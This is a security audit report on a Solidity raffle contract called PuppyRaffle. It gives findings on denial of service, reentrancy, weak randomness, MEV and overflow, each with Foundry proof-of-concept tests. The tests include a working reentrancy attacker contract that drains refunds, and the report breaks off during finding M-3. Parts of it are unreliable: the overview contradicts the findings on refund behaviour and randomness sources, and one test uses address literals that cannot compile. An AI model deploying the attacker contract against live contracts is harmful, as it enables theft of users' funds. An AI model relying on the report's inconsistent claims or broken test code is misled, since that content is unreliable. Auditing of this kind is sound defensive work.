# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
PuppyRaffle is an on-chain raffle system that mints a single "Puppy" ERC-721 NFT to the winner while handling entry fees, refunds, and protocol fees in a fully trust-minimized way.

1. Ticket Purchase  
Users call `enterRaffle(address[])` sending ETH for **each address** supplied. The contract checks duplicates and stores every unique player in an internal set. Entry price and minimum player count are fixed at deployment.

2. Refunds  
Before a winner is drawn, any player can reclaim their ETH via `refund(uint256 amount)`, which iterates through their tickets and returns the exact entry cost, using `Address.sendValue` to prevent re-entrancy.

3. Winner Selection  
Once the minimum player threshold is reached, anyone can trigger `selectWinner()`. A pseudo-random index (blockhash, timestamp, player count) is chosen; that address receives a freshly minted Puppy NFT (`_safeMint`) and the prize pool (contract balance minus protocol fee).

4. Fees  
A percentage of each entry is reserved as protocol revenue. The owner can update the `feeAddress` and withdraw accumulated fees via `withdrawFees()`.

5. Metadata  
`tokenURI` is built on-chain, Base64-encoding JSON that reveals the puppy’s rarity and image once the raffle ends.

Security is inherited from audited OpenZeppelin libraries (Ownable, ERC721, SafeMath), ensuring safe arithmetic, access control, and token compliance.
## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::enterRaffle
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. MEV issue in PuppyRaffle::selectWinner
[H-5]. Reentrancy issue in PuppyRaffle::withdrawFees
## Medium Risk Findings
[M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-2]. DOS issue in PuppyRaffle::withdrawFees
[M-3]. Array Limits issue in PuppyRaffle::refund
[M-4]. Array Limits issue in PuppyRaffle::enterRaffle
[M-5]. Unchecked Return issue in PuppyRaffle::selectWinner
[M-6]. DOS issue in PuppyRaffle::getActivePlayerIndex
[M-7]. DOS issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Pragma issue in PuppyRaffle::selectWinner
[L-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees


### Number of Findings
- H: 5
- M: 7
- L: 2
- I: 0



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function has a quadratic complexity issue when checking for duplicate players. For each new player, the function iterates through all existing players to check for duplicates. This creates an O(n²) operation which can lead to extremely high gas costs or even transaction failures due to block gas limits as the number of players increases.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

## Impact
As the number of players increases, the gas cost for entering the raffle grows quadratically. This can lead to transactions reverting due to exceeding block gas limits, effectively making the raffle unusable beyond a certain number of participants. Malicious actors could deliberately add many addresses to make the contract unusable.

## Proof of Concept
1. Start with an empty raffle
2. Have 100 players enter the raffle (reasonable number)
3. When player 101 tries to enter, the transaction requires checking against all 100 previous players
4. As more players join, each new entry becomes exponentially more expensive
5. Eventually, new entries will exceed the block gas limit (currently ~30M gas on Ethereum), making it impossible for new players to enter

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasLimitTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testGasLimitDos() public {
        // Create a large number of players
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // First batch of players enter
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
        
        // Measure gas for a new player to enter
        address[] memory newPlayer = new address[](1);
        newPlayer[0] = address(uint160(101));
        
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used for player 101 to enter:", gasUsed);
        
        // Add more players to demonstrate exponential growth
        address[] memory morePlayers = new address[](50);
        for (uint256 i = 0; i < 50; i++) {
            morePlayers[i] = address(uint160(i + 102));
        }
        puppyRaffle.enterRaffle{value: entranceFee * 50}(morePlayers);
        
        // Measure gas for another new player to enter
        address[] memory finalPlayer = new address[](1);
        finalPlayer[0] = address(uint160(152));
        
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(finalPlayer);
        gasUsed = gasStart - gasleft();
        
        console.log("Gas used for player 152 to enter:", gasUsed);
        // This will show a significant increase in gas usage
    }
}

## Suggested Mitigation
Replace the nested loop with a more efficient data structure like a mapping to track player participation:

```solidity
// Add a mapping to track active players
mapping(address => bool) public isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Check for duplicates using the mapping
        require(!isActivePlayer[player], "PuppyRaffle: Duplicate player");
        
        // Mark as active and add to players array
        isActivePlayer[player] = true;
        players.push(player);
    }
    
    emit RaffleEnter(newPlayers);
}

// Update refund function to maintain the mapping
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update the mapping
    isActivePlayer[playerAddress] = false;
    
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract is vulnerable to reentrancy attacks. When a player requests a refund, the contract sends ETH to the player before updating the state to mark the player as refunded. This allows a malicious contract to reenter the `refund` function and claim multiple refunds.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Send ETH before updating state
    payable(msg.sender).sendValue(entranceFee);
    
    // Update state after sending ETH
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
A malicious player can drain the contract's funds by repeatedly calling the refund function from a fallback function in their contract. This allows them to claim multiple refunds for a single entry, potentially draining all ETH from the contract and making it impossible for legitimate winners to receive their prizes.

## Proof of Concept
1. Attacker enters the raffle with their malicious contract address
2. Attacker calls refund() from their contract
3. When the contract sends ETH to the attacker, it triggers the attacker's fallback function
4. In the fallback function, the attacker calls refund() again with the same index
5. Since the player array hasn't been updated yet, the second refund passes the checks
6. This process repeats until the transaction runs out of gas or the contract is drained

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack(uint256 _playerIndex) external {
        playerIndex = _playerIndex;
        puppyRaffle.refund(playerIndex);
    }
    
    // Fallback function to execute the reentrancy attack
    receive() external payable {
        if (address(puppyRaffle).balance >= puppyRaffle.entranceFee()) {
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    address attackerAddress;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        attacker = new ReentrancyAttacker(puppyRaffle);
        attackerAddress = address(attacker);
        
        // Fund the attacker
        vm.deal(attackerAddress, 1e18);
        
        // Fund the contract with extra ETH to simulate other players
        vm.deal(address(puppyRaffle), 5e18);
    }
    
    function testReentrancyAttack() public {
        // Enter the attacker into the raffle
        address[] memory players = new address[](1);
        players[0] = attackerAddress;
        
        vm.prank(attackerAddress);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Record balances before attack
        uint256 attackerBalanceBefore = attackerAddress.balance;
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        
        // Execute the attack
        attacker.attack(0);
        
        // Check balances after attack
        uint256 attackerBalanceAfter = attackerAddress.balance;
        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        
        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Contract balance after:", contractBalanceAfter);
        
        // Verify the attacker received more than one refund
        assertGt(attackerBalanceAfter - attackerBalanceBefore, entranceFee);
    }
}

## Suggested Mitigation
Implement the checks-effects-interactions pattern by updating the state before sending ETH:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before sending ETH (checks-effects-interactions pattern)
    players[playerIndex] = address(0);
    
    // Send ETH after updating state
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

Alternatively, add a reentrancy guard:

```solidity
// Add a reentrancy guard state variable
bool private _notEntered = true;

// Add a modifier
modifier nonReentrant() {
    require(_notEntered, "ReentrancyGuard: reentrant call");
    _notEntered = false;
    _;
    _notEntered = true;
}

// Apply the modifier to the refund function
function refund(uint256 playerIndex) public nonReentrant {
    // ... existing code ...
}
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses weak randomness sources that can be manipulated by miners or validators. The function uses `msg.sender`, `block.timestamp`, and `block.difficulty` to generate a random number, all of which can be predicted or influenced by attackers.

```solidity
// Vulnerable randomness implementation
uint256 winnerIndex = uint256(
    keccak256(
        abi.encodePacked(
            msg.sender,
            block.timestamp,
            block.difficulty
        )
    )
) % players.length;
```

## Impact
Attackers, especially miners or validators, can manipulate the randomness to increase their chances of winning the raffle. They can simulate different transaction scenarios and choose the most favorable one, or manipulate block parameters to influence the outcome. This undermines the fairness of the raffle and allows for potential exploitation.

## Proof of Concept
1. A miner who is also a participant in the raffle can manipulate the block timestamp slightly
2. They can simulate different timestamps to find one that results in them winning
3. They can choose to include their selectWinner transaction in a block with the favorable timestamp
4. Similarly, they can choose not to mine a block if the randomness would result in someone else winning
5. This gives them a significant advantage over other participants

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle puppyRaffle;
    address attacker = address(0x1337);
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        // Initialize with a 1-day duration
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(1),
            1 days
        );
        
        // Add 4 players including the attacker
        players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = attacker;
        
        // Fund the players
        vm.deal(address(0x1), entranceFee);
        vm.deal(address(0x2), entranceFee);
        vm.deal(address(0x3), entranceFee);
        vm.deal(attacker, entranceFee);
        
        // Enter the raffle
        vm.prank(address(0x1));
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Fast forward past the raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testRandomnessManipulation() public {
        // Simulate different block parameters to find favorable conditions
        bytes32 originalRandomness;
        bytes32 manipulatedRandomness;
        
        // Calculate original randomness
        originalRandomness = keccak256(abi.encodePacked(
            address(this),
            block.timestamp,
            block.difficulty
        ));
        
        // Simulate a miner manipulating the timestamp
        uint256 favorableTimestamp = block.timestamp;
        bool found = false;
        
        // Try different timestamps to find one that makes the attacker win
        for (uint i = 0; i < 10; i++) {
            bytes32 randomValue = keccak256(abi.encodePacked(
                address(this),
                favorableTimestamp + i,
                block.difficulty
            ));
            
            uint256 winnerIndex = uint256(randomValue) % players.length;
            
            if (players[winnerIndex] == attacker) {
                found = true;
                manipulatedRandomness = randomValue;
                vm.warp(favorableTimestamp + i); // Set the block timestamp
                break;
            }
        }
        
        // If we found a favorable timestamp, demonstrate the attack
        if (found) {
            // Call selectWinner with the manipulated timestamp
            vm.prank(address(this));
            puppyRaffle.selectWinner();
            
            // Verify the attacker won
            assertEq(puppyRaffle.previousWinner(), attacker);
            console.log("Attack successful: Manipulated randomness to make attacker win");
        } else {
            console.log("Could not find a favorable timestamp in 10 attempts");
        }
    }
}

## Suggested Mitigation
Use a more secure randomness source such as Chainlink VRF (Verifiable Random Function) which provides cryptographically guaranteed randomness that cannot be manipulated by miners or users:

```solidity
// Add Chainlink VRF interfaces and variables
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    bytes32 public requestId;
    uint256 public randomResult;
    bool public raffleInProgress;
    
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration,
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash,
        uint256 _fee
    ) 
        ERC721("Puppy Raffle", "PR")
        VRFConsumerBase(_vrfCoordinator, _linkToken)
    {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;
        keyHash = _keyHash;
        fee = _fee;
        
        // Initialize rarities
        rarityToUri[COMMON_RARITY] = commonImageUri;
        rarityToUri[RARE_RARITY] = rareImageUri;
        rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;
        rarityToName[COMMON_RARITY] = COMMON;
        rarityToName[RARE_RARITY] = RARE;
        rarityToName[LEGENDARY_RARITY] = LEGENDARY;
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        require(!raffleInProgress, "PuppyRaffle: Raffle in progress");
        
        raffleInProgress = true;
        
        // Request randomness from Chainlink VRF
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK to pay fee");
        requestId = requestRandomness(keyHash, fee);
    }
    
    // Callback function used by VRF Coordinator
    function fulfillRandomness(bytes32 _requestId, uint256 _randomness) internal override {
        require(_requestId == requestId, "Wrong requestId");
        require(raffleInProgress, "Raffle not in progress");
        
        randomResult = _randomness;
        uint256 winnerIndex = randomResult % players.length;
        address winner = players[winnerIndex];
        
        // Rest of the winner selection logic
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
        
        // Mint the NFT
        uint256 tokenId = totalSupply();
        // ... rest of the NFT minting logic ...
        
        // Reset the raffle
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        raffleInProgress = false;
        
        // Transfer the prize
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        
        _safeMint(winner, tokenId);
    }
}
```

If Chainlink VRF is not an option, consider using a commit-reveal scheme or a multi-block randomness generation approach to make manipulation more difficult.

## [H-4]. MEV issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract is vulnerable to MEV (Maximal Extractable Value) attacks. The function uses transaction parameters like msg.sender and block.timestamp for randomness, which can be observed and manipulated by miners or validators to influence the outcome.

```solidity
uint256 winnerIndex = uint256(
    keccak256(
        abi.encodePacked(
            msg.sender,
            block.timestamp,
            block.difficulty
        )
    )
) % players.length;
```

## Impact
Miners, validators, or MEV searchers can manipulate the randomness to increase their chances of winning or to ensure specific participants win. They can do this by controlling the transaction ordering, manipulating timestamps within allowed bounds, or selectively including transactions. This undermines the fairness of the raffle and allows for extraction of value at the expense of honest participants.

## Proof of Concept
1. A miner or MEV searcher observes the mempool for selectWinner transactions
2. They simulate different transaction orderings and block parameters
3. They find an ordering that results in a favorable outcome (e.g., they or their accomplice wins)
4. They prioritize this ordering when producing a block or pay for priority
5. This allows them to effectively choose the winner rather than it being random

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVExploitTest is Test {
    PuppyRaffle puppyRaffle;
    address miner = address(0xMEV); // Simulated miner address
    address accomplice = address(0xACCOMPLICE); // Miner's accomplice
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        // Initialize with a 1-day duration
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(1),
            1 days
        );
        
        // Fund accounts
        vm.deal(miner, 10 ether);
        vm.deal(accomplice, 10 ether);
        
        // Add players to the raffle including the accomplice
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = accomplice;
        
        // Fund players
        for (uint256 i = 0; i < 3; i++) {
            vm.deal(players[i], entranceFee);
        }
        
        // Enter the raffle
        vm.prank(address(0x1));
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Fast forward past the raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testMEVExploit() public {
        // Simulate a miner trying different parameters to find favorable conditions
        
        // Try different caller addresses (miner can use different addresses)
        address[] memory potentialCallers = new address[](3);
        potentialCallers[0] = miner;
        potentialCallers[1] = address(0xDEAD);
        potentialCallers[2] = address(0xBEEF);
        
        // Try slight timestamp variations (within the allowed drift)
        uint256 baseTimestamp = block.timestamp;
        uint256[] memory timestamps = new uint256[](3);
        timestamps[0] = baseTimestamp;
        timestamps[1] = baseTimestamp + 1;
        timestamps[2] = baseTimestamp + 2;
        
        // Try different difficulty values
        uint256[] memory difficulties = new uint256[](3);
        difficulties[0] = 1000000;
        difficulties[1] = 2000000;
        difficulties[2] = 3000000;
        
        // Track if we found a combination that makes the accomplice win
        bool foundFavorableCondition = false;
        address favorableCaller;
        uint256 favorableTimestamp;
        uint256 favorableDifficulty;
        
        // Brute force different combinations
        for (uint256 i = 0; i < potentialCallers.length; i++) {
            for (uint256 j = 0; j < timestamps.length; j++) {
                for (uint256 k = 0; k < difficulties.length; k++) {
                    // Set block parameters
                    vm.warp(timestamps[j]);
                    vm.difficulty(difficulties[k]);
                    
                    // Calculate what the winner would be with these parameters
                    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(
                        potentialCallers[i],
                        timestamps[j],
                        difficulties[k]
                    ))) % 4; // 4 players
                    
                    address winner = puppyRaffle.players(winnerIndex);
                    
                    if (winner == accomplice) {
                        foundFavorableCondition = true;
                        favorableCaller = potentialCallers[i];
                        favorableTimestamp = timestamps[j];
                        favorableDifficulty = difficulties[k];
                        break;
                    }
                }
                if (foundFavorableCondition) break;
            }
            if (foundFavorableCondition) break;
        }
        
        if (foundFavorableCondition) {
            console.log("Found favorable condition for MEV!");
            console.log("Caller:", favorableCaller);
            console.log("Timestamp:", favorableTimestamp);
            console.log("Difficulty:", favorableDifficulty);
            
            // Execute the selectWinner with the favorable conditions
            vm.prank(favorableCaller);
            vm.warp(favorableTimestamp);
            vm.difficulty(favorableDifficulty);
            
            puppyRaffle.selectWinner();
            
            // Verify the accomplice won
            assertEq(puppyRaffle.previousWinner(), accomplice);
            console.log("MEV exploit successful: Accomplice won the raffle");
        } else {
            console.log("Could not find favorable condition in the tested combinations");
        }
    }
}

## Suggested Mitigation
Use a commit-reveal scheme or a verifiable random function (VRF) like Chainlink VRF to generate randomness that cannot be manipulated by miners or validators:

```solidity
// Using Chainlink VRF (as described in a previous finding)
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    bytes32 public requestId;
    
    constructor(
        // ... existing parameters ...
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash,
        uint256 _fee
    ) 
        ERC721("Puppy Raffle", "PR")
        VRFConsumerBase(_vrfCoordinator, _linkToken)
    {
        // ... existing initialization ...
        keyHash = _keyHash;
        fee = _fee;
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Request randomness from Chainlink VRF
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK to pay fee");
        requestId = requestRandomness(keyHash, fee);
    }
    
    // Callback function used by VRF Coordinator
    function fulfillRandomness(bytes32 _requestId, uint256 _randomness) internal override {
        // Use the provided randomness to select a winner
        uint256 winnerIndex = _randomness % players.length;
        // ... rest of winner selection logic ...
    }
}
```

Alternatively, if external oracles are not an option, implement a commit-reveal scheme where participants contribute to the randomness in a way that cannot be manipulated by miners.

## [H-5]. Reentrancy issue in PuppyRaffle::withdrawFees

## Description
The use of call function in both withdrawFees() and selectWinner() makes these transfers unsafe as they forward all available gas to the recipient.

## Impact
An attacker could exploit this to perform a reentrancy attack, especially if any state changes are made after the call.

## Proof of Concept
An exploit contract could enter a fallback function on the call and perform reentrancy if the calling contract is vulnerable.

## Proof of Code
// Proof of concept would involve testing with a reentrancy attack contract during a transaction.

## Suggested Mitigation
Use Checks-Effects-Interactions pattern, and consider using transfer or send, or utilize OpenZeppelin's ReentrancyGuard.



# Medium Risk Findings

## [M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `totalFees` variable is defined as a uint64, but it accumulates 20% of all entrance fees. As the total amount of fees collected grows, this can lead to an integer overflow, causing the totalFees to wrap around to a smaller value.

```solidity
// State variable declaration
uint64 public totalFees;

// In selectWinner function
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
```

## Impact
If the accumulated fees exceed the maximum value of uint64 (18.44 quintillion), the totalFees variable will overflow and wrap around to a smaller value. This will result in a loss of accounting for collected fees and could lead to significant financial losses for the protocol owner who is entitled to these fees.

## Proof of Concept
1. Assume the entrance fee is set to 1 ETH
2. If 1,000 players enter each raffle, that's 1,000 ETH collected
3. 20% of that is 200 ETH in fees per raffle
4. After approximately 92.2 million raffles, the totalFees would exceed 2^64-1 (max uint64)
5. At this point, adding more fees would cause the totalFees to wrap around to a smaller value
6. This results in lost fee accounting and potential financial loss

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18; // 1 ETH
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testTotalFeesOverflow() public {
        // Calculate a fee amount that, when added multiple times, will cause an overflow
        // Max uint64 is 18,446,744,073,709,551,615
        uint256 maxUint64 = type(uint64).max;
        uint256 feePerRaffle = 200 ether; // 20% of 1000 ETH (assuming 1000 players at 1 ETH each)
        
        // Set totalFees to a value close to overflow
        uint256 initialFees = maxUint64 - (2 * feePerRaffle);
        vm.store(
            address(puppyRaffle),
            bytes32(uint256(5)), // totalFees is the 6th state variable (index 5)
            bytes32(initialFees)
        );
        
        // Verify initial state
        assertEq(puppyRaffle.totalFees(), initialFees);
        
        // Create players array with 1000 players
        address[] memory players = new address[](1000);
        for (uint256 i = 0; i < 1000; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Fund the contract to simulate entrance fees
        vm.deal(address(puppyRaffle), 1000 ether);
        
        // Mock the players array in the contract
        bytes32 playersSlot = bytes32(uint256(0)); // players array is the first state variable
        vm.store(address(puppyRaffle), playersSlot, bytes32(uint256(1000))); // Set length to 1000
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + duration + 1);
        
        // Call selectWinner to trigger fee calculation
        puppyRaffle.selectWinner();
        
        // Check if overflow occurred
        uint256 newTotalFees = puppyRaffle.totalFees();
        console.log("Initial fees:", initialFees);
        console.log("New total fees:", newTotalFees);
        console.log("Expected fees (if no overflow):", initialFees + feePerRaffle);
        
        // Assert that an overflow occurred
        assertLt(newTotalFees, initialFees);
    }
}

## Suggested Mitigation
Use a larger integer type (uint256) for the totalFees variable to prevent overflow:

```solidity
// Change from uint64 to uint256
uint256 public totalFees;

// In selectWinner function, no casting needed
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + fee;
```

Alternatively, if there's a specific reason to use uint64, implement overflow checking:

```solidity
// Using SafeMath for uint64
using SafeMath for uint64;

// In selectWinner function
uint256 fee = (totalAmountCollected * 20) / 100;
require(fee <= type(uint64).max, "Fee would overflow uint64");
require(totalFees <= type(uint64).max - uint64(fee), "Total fees would overflow");
totalFees = totalFees + uint64(fee);
```

## [M-2]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has a critical vulnerability where it checks the contract's balance against the totalFees before allowing a withdrawal. However, the contract's balance can include both fees and active player deposits, leading to a situation where fees cannot be withdrawn if there are active players.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
The fee address owner cannot withdraw accumulated fees if there are any active players in the raffle. This creates a denial of service condition where fees are locked in the contract until all players have either been refunded or a winner has been selected. In a busy raffle system, this could mean fees are permanently locked if there are always active players.

## Proof of Concept
1. A raffle starts and several players enter, paying entrance fees
2. 20% of these fees are recorded in totalFees
3. Before the raffle ends, new players enter the next raffle
4. The owner tries to withdraw fees after the first raffle ends
5. The withdrawal fails because address(this).balance includes both the fees and the new players' deposits
6. If the raffle is popular and always has active players, fees may never be withdrawable

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawFeesTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testWithdrawFeesDoS() public {
        // First raffle
        address[] memory players = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Fund players
        for (uint256 i = 0; i < 5; i++) {
            vm.deal(players[i], entranceFee);
        }
        
        // Players enter first raffle
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + duration + 1);
        
        // Select winner for first raffle
        puppyRaffle.selectWinner();
        
        // Check totalFees
        uint256 expectedFees = (5 * entranceFee * 20) / 100; // 20% of 5 ETH
        assertEq(puppyRaffle.totalFees(), expectedFees);
        
        // New players enter second raffle before fees are withdrawn
        address[] memory newPlayers = new address[](3);
        for (uint256 i = 0; i < 3; i++) {
            newPlayers[i] = address(uint160(i + 100));
        }
        
        // Fund new players
        for (uint256 i = 0; i < 3; i++) {
            vm.deal(newPlayers[i], entranceFee);
        }
        
        vm.prank(newPlayers[0]);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(newPlayers);
        
        // Try to withdraw fees
        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Verify that fees are locked in the contract
        assertEq(puppyRaffle.totalFees(), expectedFees);
        assertGt(address(puppyRaffle).balance, expectedFees);
        console.log("Total fees:", puppyRaffle.totalFees());
        console.log("Contract balance:", address(puppyRaffle).balance);
        console.log("Fees are locked due to active players");
    }
}

## Suggested Mitigation
Modify the withdrawFees function to allow partial withdrawals of fees, regardless of active players:

```solidity
function withdrawFees() external {
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Insufficient balance");
    
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

This change allows the fee address to withdraw accumulated fees at any time, as long as the contract has sufficient balance to cover the fees, regardless of whether there are active players.

## [M-3]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function allows players to get a refund by setting their address to address(0) in the players array. However, this creates a discrepancy between the actual number of players and the length of the players array, which can lead to issues when selecting a winner.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
When a player gets a refund, their slot in the players array is set to address(0) but not removed. This means the array length remains the same, and address(0) entries are still counted when calculating prize pools and selecting winners. This can lead to incorrect prize calculations and potentially selecting address(0) as a winner, which would result in lost funds.

## Proof of Concept
1. Several players enter the raffle
2. Some players request refunds, setting their addresses to address(0) in the array
3. When selectWinner is called, the total prize is calculated based on the length of the players array, including address(0) entries
4. If address(0) is selected as the winner, the prize will be sent to the zero address and lost forever
